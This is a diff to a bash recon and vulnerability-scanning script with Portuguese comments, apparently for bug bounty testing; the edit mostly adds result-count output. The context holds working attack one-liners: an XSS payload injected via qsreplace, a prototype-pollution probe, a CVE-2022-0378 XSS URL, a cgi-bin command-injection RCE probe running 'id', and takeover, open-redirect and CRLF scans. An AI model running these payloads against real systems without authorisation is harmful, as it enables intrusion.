@@ -223,7 +223,7 @@ echo -e "\e[1;31m$(wc -l < "$folder/EndpointsHakrawler.txt")\e[0m"
 
 # Executando cariddi
 echo -e "\e[33mExecutando cariddi...\e[0m"
-cat "$folder/live_subdomains.txt" | cariddi -ot "$folder/cariddi.txt"
+cat "$folder/live_subdomains.txt" | cariddi -intensive > "$folder/cariddi.txt"
 echo -e "\e[1;31m$(wc -l < "$folder/cariddi.txt")\e[0m"
 
 # Executando katana 
@@ -285,35 +285,42 @@ echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"
 # teste xss
 echo -e "\e[32mExecutando qsreplace xss...\e[0m"
 cat "$folder/xss.txt" | uro | grep "=" | qsreplace '"><img src=x onerror=alert(1);>' | airixss -payload "alert(1)" | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/qsreplaceVul.txt")\e[0m"
 
 # One-line test
 # Prototype Pollution One-line
 echo -e "\e[32mPrototype Pollution One-line\e[0m"
 httpx -l "$folder/subdomains.txt" -threads 200 | anew -q FILE.txt && sed 's/$/\/?_proto_[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOTVULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" > "$folder/PrototypeP.txt"      
 rm FILE.txt
+echo -e "\e[1;31m$(wc -l < "$folder/PrototypeP.txt")\e[0m"
 
 # One-line CVE-2022-0378
 echo -e "\e[32mCVE-2022-0378 One-line\e[0m"
 cat "$folder/live_subdomains.txt" | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"| grep -qs "onmouse" && echo "$h: VULNERABLE - URL: $h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"; done > "$folder/CVE-2022-0378.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/CVE-2022-0378.txt")\e[0m"
 
 # One-line Rce
 echo -e "\e[32mRCE One-line\e[0m"
 cat "$folder/subdomains.txt" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | grep -q "uid=" && echo "$h: VULNERABLE" > "$folder/RceOneline.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/RceOneline.txt")\e[0m"
 
 # takeover vulnerabilities
 # criar caminho e add o arquivo abaixo
 #https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json
 echo -e "\e[32mExecutando takeover Vulnerabilit\e[0m"
 subjack -w "$folder/subdomains.txt" -t 20 -a -o "$folder/takeover.txt" -ssl
+echo -e "\e[1;31m$(wc -l < "$folder/takeover.txt")\e[0m"
 
 # openredirect
 # passar caminho template open-redirect
 echo -e "\e[32mExecutando open-redirect Vulnerabilit\e[0m"
 cat "$folder/redirect.txt" | nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/open-redirect.yaml -o "$folder/open-redirectVUL.txt" 
+echo -e "\e[1;31m$(wc -l < "$folder/open-redirectVUL.txt")\e[0m"
 
 # crlfuzz 
 echo -e "\e[32mExecutando crlfuzz Vulnerabilit\e[0m"
 crlfuzz -l "$folder/live_subdomains.txt" -c 50 -s -o "$folder/crlfVul.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/crlfVul.txt")\e[0m"
 
 # dalfox
 echo -e "\e[32mExecutando dalfox Vulnerabilit\e[0m"
